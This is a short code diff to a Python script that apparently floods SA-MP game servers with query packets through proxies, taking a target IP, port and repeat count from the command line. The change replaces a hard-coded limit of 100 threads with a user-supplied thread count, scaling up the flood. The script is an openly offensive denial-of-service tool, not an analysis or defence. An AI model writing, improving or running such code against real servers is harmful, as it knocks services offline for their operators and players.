@@ -48,6 +48,7 @@ print("████████████████████████�
 target_ip = sys.argv[1]
 target_port = int(sys.argv[2])
 times = int(sys.argv[3])
+threadtotal = int(sys.argv[4])
 start_time = time.time()
 payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'
 
@@ -74,7 +75,7 @@ def worker():
             blacklisted_proxies.add(proxy)
     return
     
-while threading.active_count() >= 100:
+while threading.active_count() >= threadtotal:
     pass
 threading.Thread(target=worker).start()
 
